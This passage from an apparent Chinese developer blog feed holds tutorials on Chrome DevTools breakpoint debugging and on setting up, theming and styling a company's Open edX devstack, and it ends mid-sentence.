Proxies。将本地的8080端口映射到远程的80端口上，当我访问本地的80端口，实际返回的就是远程80端口的提供的内容。</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5b4f005ae51d45191c7e534a" target="_blank" rel="noopener">Charles 抓包二三谈</a></li></ul>]]></content>
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chrome断点调试</title>
      <link href="/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
      <url>/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<blockquote><p>断点调试是指自己在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看到各个变量当前的值。</p></blockquote><p><br></p><h3 id="1-Sources面板"><a href="#1-Sources面板" class="headerlink" title="1. Sources面板"></a>1. Sources面板</h3><p>Sources是Chrome developer tool中的断点调试面板。<br><br><br><img src="/2019/05/24/Chrome断点调试/1.png" style="max-width:500px"><br>【图1】网站文件目录树<br>【图2】左侧所选文件的具体内容<br>【图3】scope显示当前断点的作用域，watch点击 + 号可添加你需要监控的变量或表达式<br>【图4】核心功能区<br>Call Stack: 显示当前断点的环境调用栈<br>Breakpoints: 当前js断点列表<br>DOM Breakpoints: 当前DOM断点列表<br>XHR Breakpoints: 当前xhr断点列表，点击 + 添加断点<br>Event Listener Breakpoints: 当前事件监听断点列表</p><p><br></p><h3 id="2-设置断点"><a href="#2-设置断点" class="headerlink" title="2. 设置断点"></a>2. 设置断点</h3><h4 id="2-1-JS断点"><a href="#2-1-JS断点" class="headerlink" title="2.1 JS断点"></a>2.1 JS断点</h4><h5 id="2-1-1-手动加断点"><a href="#2-1-1-手动加断点" class="headerlink" title="2.1.1 手动加断点"></a>2.1.1 手动加断点</h5><p>打开开发者工具 —— 点击Source菜单 —— 左侧树中找到相应文件 —— 点击行列号，即完成当前行添加/删除断点操作。断点添加完毕后，刷新页面js执行到断点位置停住。在Sources界面，会看到当前作用域中所有变量和值，只需对每个值进行验证即可。<br>你还可以设置条件断点，右击断点位置，选择Edit Breakpoint，设置触发断点的表达式，表达式为true时才触发断点。</p><p><br></p><h5 id="2-1-2-debugger"><a href="#2-1-2-debugger" class="headerlink" title="2.1.2 debugger"></a>2.1.2 debugger</h5><p>还可以在代码中添加<code>debugger;</code>，代码执行到该语句时就会自动断点。</p><p><br></p><h5 id="2-1-3-功能键"><a href="#2-1-3-功能键" class="headerlink" title="2.1.3 功能键"></a>2.1.3 功能键</h5><p>断点调试主要用到以下功能键，从左到右依次为</p><p><img src="/2019/05/24/Chrome断点调试/3.png" style="max-width:500px"></p><ul><li>Pause/Resume script execution: 暂停/恢复脚本执行（程序执行到下一个断点停止）</li><li>Step over next function call: 执行到下一步的函数调用(跳到下一行)</li><li>Step into next function call: 进入当前函数</li><li>Step out of current function: 跳出当前执行函数</li><li>Deactive/Active all breakpoints: 关闭/开启所有断点（不会取消）</li><li>Pause on exceptions: 异常情况自动断点设置</li></ul><p><br></p><h5 id="2-1-4-解压js"><a href="#2-1-4-解压js" class="headerlink" title="2.1.4 解压js"></a>2.1.4 解压js</h5><p>如果碰到压缩后的js代码，可以点击下面的按钮解压</p><p><img src="/2019/05/24/Chrome断点调试/6.png" style="max-width:500px"></p><p><br></p><h4 id="2-2-DOM断点"><a href="#2-2-DOM断点" class="headerlink" title="2.2 DOM断点"></a>2.2 DOM断点</h4><p>打开Elements面板 —— 定位到相关DOM节点 —— 右击DOM，选择Break on，选择相应选项<br><em>subtree modifications</em><br>子节点变化断点。针对子节点增加、删除以及交换顺序等操作，但子节点进行属性修改和内容修改并不会触发断点<br><em>attributes modifications</em>:节点属性断点<br><em>node removal</em>: 节点移除断点<br><br><br><img src="/2019/05/24/Chrome断点调试/2.png" style="max-width:500px"></p><p><br></p><h4 id="3-XHR断点"><a href="#3-XHR断点" class="headerlink" title="3. XHR断点"></a>3. XHR断点</h4><p>通过XHR Breakpoints 的 + 号，当异步请求URL满足条件时，会自动产生断点。<br><br><br><img src="/2019/05/24/Chrome断点调试/4.gif" style="max-width:500px"></p><p><br></p><h4 id="4-事件监听断点"><a href="#4-事件监听断点" class="headerlink" title="4. 事件监听断点"></a>4. 事件监听断点</h4><p>当事件被触发时，断点到事件绑定的位置。包括鼠标、键盘、动画、定时器、xhr等。<br><br><br><img src="/2019/05/24/Chrome断点调试/5.gif" style="max-width:500px"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/yzg1/p/5578363.html" target="_blank" rel="noopener">chrome developer tool—— 断点调试篇</a></li><li><a href="https://juejin.im/post/5af53823f265da0b75282b0f" target="_blank" rel="noopener">chrome开发者工具各种骚技巧</a></li></ul>]]></content>
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Django</title>
      <link href="/2019/05/10/Django/"/>
      <url>/2019/05/10/Django/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>快速开始Edx-H版开发</title>
      <link href="/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/"/>
      <url>/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/</url>
      <content type="html"><![CDATA[<h3 id="1-前提"><a href="#1-前提" class="headerlink" title="1. 前提"></a>1. 前提</h3><p>要快速入门edx，首先你可以体验一下英荔商学院，</p><ul><li>阿里云生产服  <a href="https://www.elitemba.cn/" target="_blank" rel="noopener">https://www.elitemba.cn/</a></li><li>腾讯云测试服 lms <a href="http://www.eliteu.xyz/" target="_blank" rel="noopener">http://www.eliteu.xyz/</a></li><li>腾讯云测试服 cms <a href="http://studio.eliteu.xyz/" target="_blank" rel="noopener">http://studio.eliteu.xyz/</a></li></ul><p>同时还可以</p><ul><li>通过edx官方文档进一步了解  <a href="http://docs.edx.org/" target="_blank" rel="noopener">http://docs.edx.org/</a></li><li>其他用edx搭建的网站：<a href="http://www.xuetangx.com/" target="_blank" rel="noopener">http://www.xuetangx.com/</a> , <a href="https://www.edx.org" target="_blank" rel="noopener">https://www.edx.org</a></li></ul><p>了解edx H版前，你需要掌握一些基本知识</p><ul><li>Docker <a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a> </li><li>git    <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a></li><li>React  <a href="https://react.docschina.org/" target="_blank" rel="noopener">https://react.docschina.org/</a></li><li>Sass   <a href="https://www.sass.hk/" target="_blank" rel="noopener">https://www.sass.hk/</a></li></ul><p><br></p><h3 id="2-安装启动"><a href="#2-安装启动" class="headerlink" title="2. 安装启动"></a>2. 安装启动</h3><h4 id="2-1-安装项目"><a href="#2-1-安装项目" class="headerlink" title="2.1 安装项目"></a>2.1 安装项目</h4><p>这里假设你已经完成安装，如果没有，<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">前往安装</a>。<br>拉取公司最新代码，修改配置文件。每个文件夹对应一个git仓库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└── devstack  </span><br><span class="line">└── ecommerce       # 单课购买        https://github.com/e-ducation/ecommerce</span><br><span class="line">└── edx-membership  # 会员购买        https://github.com/e-ducation/edx-membership</span><br><span class="line">└── edx-platform    </span><br><span class="line">    # lms学习平台, cms创建课程平台      https://github.com/e-ducation/edx-platform</span><br><span class="line">└── eliteu-payments # 微信支付宝支付   https://github.com/e-ducation/eliteu-payments</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-启动项目"><a href="#2-1-启动项目" class="headerlink" title="2.1 启动项目"></a>2.1 启动项目</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd devstack</span><br><span class="line">make dev.up   # 启动项目</span><br></pre></td></tr></table></figure><p>启动服务后，每个服务都可以在<code>localhost</code>的特定端口被访问(<code>docker ps</code>查看所有url)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Service           URL</span><br><span class="line">E-commerce        http://localhost:18130/dashboard/</span><br><span class="line">LMS               http://localhost:18000/</span><br><span class="line">Studio/CMS        http://localhost:18010/</span><br></pre></td></tr></table></figure></p><p>本地环境会自动创建一个超级用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Email: edx@example.com</span><br><span class="line">Username: edx</span><br><span class="line">Password: edx</span><br></pre></td></tr></table></figure></p><p>LMS还提供了不同身份的账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username    Email                   Password</span><br><span class="line">audit      audit@example.com       edx</span><br><span class="line">honor      honor@example.com       edx</span><br><span class="line">staff      staff@example.com       edx</span><br><span class="line">verified  verified@example.com    edx</span><br></pre></td></tr></table></figure></p><p>有了这些url和账号密码，你可以在本地把业务流程都走一遍：<br>创建课程，使用优惠券购买单课，会员购买，课程学习——习题，讨论，维基，教师面板等</p><p><br></p><h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>使用<code>make</code>命令可以查看所有make命令，下面列举一些常用操作。<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">更多命令查看</a></p><ul><li><p><em>修改配置文件</em><br>通过<code>make &lt;service&gt;-shell</code>进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 进入lms容器</span><br><span class="line">make lms-shell</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 进入lms-shell后，你可以修改各种配置文件</span><br><span class="line">/edx/app/edxapp/lms.env.json</span><br><span class="line">/edx/app/edxapp/lms.auth.json</span><br><span class="line">/edx/app/edxapp/cms.env.json</span><br><span class="line">/edx/app/edxapp/cms.auth.json</span><br></pre></td></tr></table></figure></li><li><p><em>查看日志</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 查看运行中的容器的日志</span><br><span class="line">make logs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 查看特定的容器的日志</span><br><span class="line">make lms-logs</span><br><span class="line">make discovery-logs</span><br></pre></td></tr></table></figure></li><li><p><em>编译静态资源</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 编译lms静态资源</span><br><span class="line">make lms-static  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 只编译normal-theme(英荔的主题包)</span><br><span class="line">make lms-shell</span><br><span class="line">paver update_assets --theme-dirs=/edx/app/edxapp/edx-platform/themes --themes=normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 自动编译sass文件</span><br><span class="line">make lms-shell</span><br><span class="line">paver watch_assets --td /edx/app/edxapp/edx-platform/themes --t normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 如果在执行paver命令时遇到了异常，加上--settings=devstack_docker查看报错信息</span><br><span class="line">paver update_assets --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>更新数据库</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">make lms-shell</span><br><span class="line">paver update_db</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 只更新lms的某个app</span><br><span class="line"><span class="meta">#</span> 更新/edx-platform/lms/djangoapps/badges, appname为badges</span><br><span class="line">make lms-shell</span><br><span class="line">source /edx/app/edxapp/edxapp_env</span><br><span class="line">cd /edx/app/edxapp/edx-platform</span><br><span class="line">./manage.py &lt;lms/cms&gt; makemigrations &lt;appname&gt; --settings=devstack_docker</span><br><span class="line">./manage.py &lt;lms/cms&gt; migrate &lt;appname&gt; --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>重启服务</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> service可取值: discovery, ecommerce, lms, studio</span><br><span class="line">docker-compose restart &lt;service&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 或者直接使用make命令</span><br><span class="line">make lms-restart</span><br></pre></td></tr></table></figure></li><li><p><em>停止所有服务</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make stop</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-代码修改"><a href="#3-代码修改" class="headerlink" title="3. 代码修改"></a>3. 代码修改</h3><p>前端代码修改主要包括</p><ul><li><p>主题样式<br>根据设计稿，响应式布局，一个页面兼容pc，手机，需考虑中英文两种情况。兼容到IE11</p></li><li><p>浏览器兼容<br>js不生效，样式兼容</p></li><li><p>翻译修改<br>翻译未包，修改英文文案</p></li><li><p>新增页面<br>教授介绍页，membership会员介绍页，会员购买页(微信支付宝)，课程简介html编写等</p></li><li><p>修改功能<br>①登录账号可输入邮箱，变为可输入手机+邮箱；<br>②绑定手机<br>③生成证书图片；<br>④接入微信sdk实现转发课程详情页显示链接头像，等等</p></li><li><p>协助后端解决bug</p></li></ul><p><br><br><br></p><h3 id="4-配置主题"><a href="#4-配置主题" class="headerlink" title="4. 配置主题"></a>4. 配置主题</h3><p>先阅读<a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">官方文档</a>，了解主题包如何创建，修改，配置。</p><p><em>主题包可以放什么文件 ？</em><br>To override the files that constitute the default Open edX theme, you create replacements for one or more of those files, place them in the file paths that are constructed and named in parallel to the default file locations, configure your Open edX instance to use the files in your theme’s directories instead of the default locations, and then compile the theme.<br>(EdX first looks for files in your theme directories, and uses any file that matches the exact file path and file name of a default UI file.)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/lms/static/images</span><br><span class="line">/edx-platform/lms/static/sass</span><br><span class="line">/edx-platform/lms/templates</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 想要覆盖上面的文件，需要在主题包里创建对应的文件</span><br><span class="line">/themes/normal-theme/lms/static</span><br><span class="line">/themes/normal-theme/lms/sass</span><br><span class="line">/themes/normal-theme/lms/templates</span><br></pre></td></tr></table></figure></p><p><br><br><em>添加主题包</em><br>在<code>/edx-platform/themes</code>新建一个文件夹<code>normal-theme</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">normal-theme</span><br><span class="line">    ├── README.rst</span><br><span class="line">    ├─── lms</span><br><span class="line">    |     ├── static</span><br><span class="line">    |     |      └── images</span><br><span class="line">    |     |      |     └── logo.png</span><br><span class="line">    |     |      |</span><br><span class="line">    |     |      └── sass</span><br><span class="line">    |     |            └── partials</span><br><span class="line">    |     |                   └── base</span><br><span class="line">    |     |                        └── _variables.scss</span><br><span class="line">    |     |</span><br><span class="line">    |     └── templates</span><br><span class="line">    |             └── footer.html</span><br><span class="line">    |             └── header.html</span><br></pre></td></tr></table></figure></p><p><br><br><em>修改配置文件</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 进入文件目录</span><br><span class="line">make lms-shell</span><br><span class="line">cd /edx/app/edxapp</span><br><span class="line">LMS         /edx/app/edxapp/lms.env.json</span><br><span class="line">Studio       /edx/app/edxapp/cms.env.json</span><br><span class="line">E-commerce   /edx/etc/ecommerce.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 修改配置项</span><br><span class="line">"ENABLE_COMPREHENSIVE_THEMING": true,</span><br><span class="line">"COMPREHENSIVE_THEME_DIRS": [</span><br><span class="line">  "/edx/app/edxapp/edx-platform/themes"</span><br><span class="line">],</span><br><span class="line">"THEME_NAME": "normal-theme",</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 重启服务</span><br><span class="line">docker-compose restart lms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 编译静态资源</span><br><span class="line">make lms-static</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 进入`localhost:18000/admin`,进入Site themes, 添加site themes。保存后，访问0.0.0.0:18000即生效。</span><br><span class="line">Site:</span><br><span class="line">Domain name: 0.0.0.0:18000</span><br><span class="line">Display name: normal-theme</span><br><span class="line">Theme dir name: normal-theme</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-主题修改"><a href="#5-主题修改" class="headerlink" title="5. 主题修改"></a>5. 主题修改</h3><p>改edx主题是一件非常痛苦的事件。每改一个地方，需要执行一次编译命令，才能看到效果。快则1分钟，慢则20分钟。同时，edx的模板层层嵌套，同一个className会应用到多个页面，牵一发动全身。加上className又长又乱，css也是没啥章法，<code>border-box</code>与<code>content-box</code>混用，样式乱加<code>!important</code>，很多时候你不得不再强制加一个<code>!important</code>去覆盖它。加上本身没有使用任何基础库，因此衍生出很多兼容问题。</p><ul><li>值得高兴的是，大部分页面都已经完成了样式调整。</li><li>开发环境走了另一套编译，你无需执行edx的编译命令，就可以看到修改效果。</li><li>如果有新增的需求，你需要遵循一些设计规范。</li></ul><p><br></p><h4 id="5-1-sass编译"><a href="#5-1-sass编译" class="headerlink" title="5.1 sass编译"></a>5.1 sass编译</h4><p>先确保安装了<a href="https://www.sass.hk/install/" target="_blank" rel="noopener">Sass</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> edx-platform编译</span><br><span class="line"><span class="meta">#</span> 注意，当编译不是主题包里面的sass文件时，依然要走edx的编译命令 make lms-static</span><br><span class="line">cd edx-platform/themes/normal-theme/lms/static/</span><br><span class="line">sass --watch sass:css --no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> edx-membership编译</span><br><span class="line">cd edx-membership/membership/static/membership/</span><br><span class="line">sudo sass --watch sass:css --no-cache</span><br></pre></td></tr></table></figure></p><p>edx不同页面引用了不同的css文件，因此产生了很多入口文件，具体见<code>/edx-platform/lms/static/sass</code>，里面没有以<code>_</code>开头的文件都是一个入口文件。</p><p>当你需要新增一个入口文件，应当先将其对应的css文件<code>/edx-platform/lms/static/css</code>转换为scss文件，复制到<code>normal-theme/lsm/static/sass/default</code>。入口文件，应先引用该文件，代表着先引用了edx原有样式。然后你可以把你的修改放进<code>normal-theme/lsm/static/sass/modify</code>文件。</p><p>当edx升级版本时，你需要更新<code>/default</code>的内容。而你额外的修改将得到保留。当然如果发生了翻天覆地的变动，就另说。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">normal-theme/lsm/static/sass</span><br><span class="line">    ├─── bootstrap</span><br><span class="line">    |     ├── lms-main.scss  # 入口文件</span><br><span class="line">    ├─── default             # edx原有样式</span><br><span class="line">    |     ├── _lms-course.scss</span><br><span class="line">    |     ├── _lms-discussion-bootstrap.scss</span><br><span class="line">    |     ├── _lms-main-v1.scss</span><br><span class="line">    |     ├── _lms-main-v2.scss</span><br><span class="line">    |     ├── _lms-main.scss</span><br><span class="line">    ├─── discussion</span><br><span class="line">    |     ├── lms-discussion-bootstrap.scss  # 入口文件</span><br><span class="line">    ├─── modify</span><br><span class="line">    |     ├── lms</span><br><span class="line">    |     |      └── course            # 课程相关</span><br><span class="line">    |     |      └── footer            </span><br><span class="line">    |     |      └── page              </span><br><span class="line">    |     |      └── _extras.scss      # 集合了header,footer,iconfont,base,alert等共用规则，所有入口文件均可先引用这一文件</span><br><span class="line">    |     |      └── _variables.scss   # 定义sass变量</span><br><span class="line">    ├─── lms-course.scss     # 入口文件</span><br><span class="line">    ├─── lms-main-v1.scss    # 入口文件</span><br><span class="line">    ├─── lms-main-v2.scss    # 入口文件</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-一些规范"><a href="#5-2-一些规范" class="headerlink" title="5.2 一些规范"></a>5.2 一些规范</h4><ul><li><em>适配要求</em><br>pc响应式布局，兼容ipad，手机，兼容IE11<br>图片资源pc使用二倍图，手机使用三倍图<br>pc设计稿尺寸1400px*auto (内容1200px*auto), 手机设计稿尺寸375px*auto<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 兼容ipad */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">768px</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 兼容手机，考虑了部分手机横屏的情况 */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">767px</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>变量</em><br>更多变量查看 <code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/_variables.scss</code>，设计稿有时不会100%按这个标准，此时应优先使用这些变量。<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 主色调 */</span> </span><br><span class="line">$primary: #4788C7;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 字体颜色: 标题，正文，注释，placeholder */</span> </span><br><span class="line">$title: #2E313C;</span><br><span class="line">$font: #656D78;</span><br><span class="line">$note: #AAB2BD;</span><br><span class="line">$placeholder: #ccd1d9;</span><br><span class="line">$font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,"Helvetica Neue", Helvetica,Tahoma，Arial, "PingFang SC", "Hiragino Sans GB", </span><br><span class="line">"<span class="selector-tag">Heiti</span> <span class="selector-tag">SC</span>", "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>", "<span class="selector-tag">WenQuanYi</span> <span class="selector-tag">Micro</span> <span class="selector-tag">Hei</span>",<span class="selector-tag">SimHei</span>，<span class="selector-tag">sans-serif</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* border */</span></span><br><span class="line">$border:#b6dcfe;</span><br><span class="line">$border-gray: #f5f7fa;</span><br><span class="line">$border-radius: 3px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文字体统一为14px */</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>通用样式</em><br>查看<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_base.scss</code>，这个文件定义了button, input, select, <code>&lt;a&gt;</code>的样式。开发时应统一使用这些变量。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@extend %btn-my-primary;</span><br><span class="line">@extend %btn-my-white;</span><br><span class="line">@extend %btn-my-disable;</span><br><span class="line"></span><br><span class="line">@extend %input-my;</span><br><span class="line">@extend %input-my-checkbox;</span><br><span class="line">@extend %input-my-radio;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p><em>避免修改外层div的class样式</em><br>edx所有页面均被下面两个<code>&lt;div&gt;</code>包裹，注意不要轻易修改、新增这两个className的样式，不然其他页面都会发生变动。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"window-wrap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content-wrapper"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>除了这两个className，页面里面也有很多很多很多共用的className。<br>修改sass的时候，应当在外面包一个专属这个页面的className，避免影响到其他页面</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_login.scss</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 只对login-register下的h2生效 */</span></span><br><span class="line"><span class="selector-class">.login-register</span>&#123;</span><br><span class="line">  h2&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>替换icon</em><br>icon使用雪碧图替换，具体查看<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_iconfont.scss</code></li></ul><p><br></p><h4 id="5-3-替换templates"><a href="#5-3-替换templates" class="headerlink" title="5.3 替换templates"></a>5.3 替换templates</h4><p>如果需要修改/templates，需把原来的模板文件复制一份，放到主题下，在其基础上修改。<br>当模板里需要添加图片需使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$&#123;static.url("</span><span class="attr">images</span>/<span class="attr">logo.svg</span>")&#125; "&gt;</span></span><br></pre></td></tr></table></figure></p><p>Note that the code snippet ${static.url(“images/logo.svg”)} directs Mako to leverage the comprehensive theming system, which will first check to see if your custom theme contains the file “logo.svg”, and if so, then this is the image file that will be sent to the browser. </p><p>All image files and other “static assets” are pre-processed using an open source utility named Paver that consolidates the files into a caching area located in <code>/edx/var/edxapp/staticfiles</code> whereupon each file is individually optimized.</p><p><br></p><h3 id="6-edx前端技术选型"><a href="#6-edx前端技术选型" class="headerlink" title="6. edx前端技术选型"></a>6. edx前端技术选型</h3><p>Edx前端囊括了展示给用户的所有东西，主要包括用Python渲染的views，用js写的页面交互，和css样式。</p><p><em>Edx相关技术</em></p><ul><li>Test: React components can be tested in isolation with unit tests using <code>Jest</code> and 